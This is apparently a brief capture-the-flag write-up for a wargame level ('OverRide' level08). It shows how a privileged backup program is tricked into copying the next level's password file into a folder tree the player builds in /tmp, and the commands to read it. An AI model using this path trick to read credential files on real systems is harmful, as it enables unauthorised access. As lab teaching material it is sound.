=> The program try to open the first argument prefixed by "./backups/" like "./backups/" + argv[1]  
=> We can't open the flag pass directly because the folders ("...home/user/...") doesn't exist in the home folder 
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

=> Let's switch to /tmp and create a this folder structure
mkdir -p ./backups/home/users/level09/

=> We execute the program with our new backups struct 
~/level08 /home/users/level09/.pass

=> It works ! The "./backups//home/users/level09/.pass" is resolved by our folders structure
cat ./backups/home/users/level09/.pass
